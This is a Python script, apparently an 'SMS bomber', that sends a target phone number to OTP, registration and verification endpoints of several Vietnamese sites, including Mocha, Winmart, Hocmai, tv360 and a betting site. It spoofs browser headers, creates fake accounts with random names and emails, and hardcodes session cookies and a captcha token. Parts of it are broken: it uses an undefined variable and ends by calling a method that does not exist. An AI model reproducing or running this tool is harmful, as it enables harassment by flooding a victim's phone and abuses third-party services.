#CODER : TRAN TUAN PHONG | DEV.TTP
import requests
import os
import sys
import certifi
import random
import string
import time
class Api:
  def __init__(self,phone):
    self.phone = phone
    self.headers ={
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip",
      "Accept-Language": "vi-VN",
      "Sec-Ch-Ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": '"Windows"',
      "Sec-Fetch-Dest":"empty",
      "Sec-Fetch-Mode":"cors",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
  def Fullname(self):
    ho = ["Tran","Le","Nguyen","Huynh","Dang","Pham","Vu","Phan"]
    dem = ["Van","Duc","That","Hoang"]
    ten =["Phong","Nam","Khoi","Duy","Phat","Dat","Quang"]
    full= random.choice(ho)+" "+random.choice(dem)+" "+random.choice(ten)
    return full
  def Email(self):
    #number = so chu cai random password
    #password = join(random.choice(string.printable) for i in range(number))
    result_str = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    number = ''.join(random.choice(string.digits) for i in range(4))
    email = result_str+str(number)
    return email
  
  def Time(self):
    now = time.localtime()
    formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", now)
    my_time = time.strptime(formatted_time,
                        "%Y-%m-%d %H:%M:%S")
    # Convert the struct_time object to a floating-point number
    seconds_since_epoch = time.mktime(my_time)
    print(seconds_since_epoch)
  
  def Mocha(self):
    phone=self.phone
    self.headers.update({"Connection": "keep-alive","Host":"apivideo.mocha.com.vn","Origin":"https://video.mocha.com.vn","Referer":"https://video.mocha.com.vn/","Content-Length":"0"})
    headers= self.headers
    textmocha = requests.post(f"https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={phone}&languageCode=vi", headers=headers).text
    print(textmocha)
  
  def current_milli_time(self):
    return round(time.time() * 1000)
  
  def Winmart(self):
    phone = self.phone
    self.headers.update({"Access-Control-Request-Method": "GET","Origin":"https://winmart.vn","Referer":"https://winmart.vn/"})
    headers = self.headers
    requests.options(f"https://api-crownx.winmart.vn/cs/api/winlife/check-profile?phoneNo={phone}&identifyCardId=undefined",headers=headers).text
    requests.get(f"https://api-crownx.winmart.vn/cs/api/winlife/check-profile?phoneNo={phone}&identifyCardId=undefined",headers=headers).text
    requests.options(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=headers).text
    check=requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=headers).text
    print("Check 1: "+check)
  
  def Hoc_Mai(self):
    phone = self.phone
    headers=self.headers
    fullname = self.Fullname()
    email= self.Email()
    data = {"name": fullname,
"password":"B*in*1209",
"email": str(email)+"@gmail.com",
"phone": phone}
    check =requests.post("https://hocmai.vn/loginv2/register.php",headers=headers,data=data)
    print(check.text)
    headers.update({"Content-Length":"27",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"Origin":"https://hocmai.vn",
"Referer":"https://hocmai.vn/user/profile/confirm-phone.php?a=",
"Sec-Fetch-Site":"same-origin",
"X-Requested-With":"XMLHttpRequest"})
    check3 = requests.post("https://hocmai.vn/user/profile/getcode.php",headers=headers,cookies=check.cookies,data={"phone":phone,"action": "add"})
  
  def Ibet8vn(self):
    phone=self.phone
    self.headers.update({"Cache-Control":"no-cache",
"Client-Id":"354C967A20E44811B4D9EF0802CC52F3",
"Content-Length":"714",
"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundary5rA6JJGr3H8ELIB2",
"Cookie":"nitroCachedPage=1; JgtmEyd=ieUxrq6ulQ; uEPcqorx-pOlZdzv=l%40TpxsPhADMB7ZY; _gid=GA1.2.336259022.1690444880; _gat_gtag_UA_150268507_1=1; _gat_UA-150268507-1=1; _gat_UA-150268507-3=1; _ga_8036W49BKS=GS1.2.1690444880.1.0.1690444880.0.0.0; _ga_BZ4QJN33LS=GS1.1.1690444878.1.0.1690444883.0.0.0; _ga_4MCQF2DPF3=GS1.1.1690444883.1.0.1690444883.0.0.0; _ga=GA1.1.177803491.1690444879",
"Origin":"https://i8vn.co",
"Referer":"https://i8vn.co/ap-member/sign/signup",
"Sec-Fetch-Site":"same-origin",
"Site-Id":"C"})
    data={"countryCode": "+84",
"phone": "0334390658",
"mode": "signUp",
"captchaId": "STRUVlN0YVpXRTFVdno3VUpCbDZaV2U1dkhGY2cyYTdacTh5T2JxLzJ2MFl4OXE4aHZ3UGMvb2xNc3AwWkpoeWUvTmVqVmhTSWtFM1BXWTJuMEIvaW1BRkNyM1NOdG10c3dSSW8yQXhuMUtEUWZLWldiYllKQ0lGTGVMMFFwMEM=",
"captchaCode": "Q3HE"}
    check=requests.post("https://i8vn.co/api5-member/api/auth/base/sendSMSCode",headers=self.headers,data=data)
    print(check.text)
  def Hasaki(self):
    phone=self.phone
    requests.get(f"https://hasaki.vn/ajax?api=user.verifyUserName&username={phone}")
    requests.get(f'https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={phone}').text
    print(chec.text)
  
  def Tv360(self):
    phone=self.phone
    headers={"Host": "m.tv360.vn",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Origin": "http://m.tv360.vn",
    "Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F",
    "Accept-Encoding": "gzip, deflate"}
    check = requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":phone})).text
    print(check)
Api("#").Tamo()
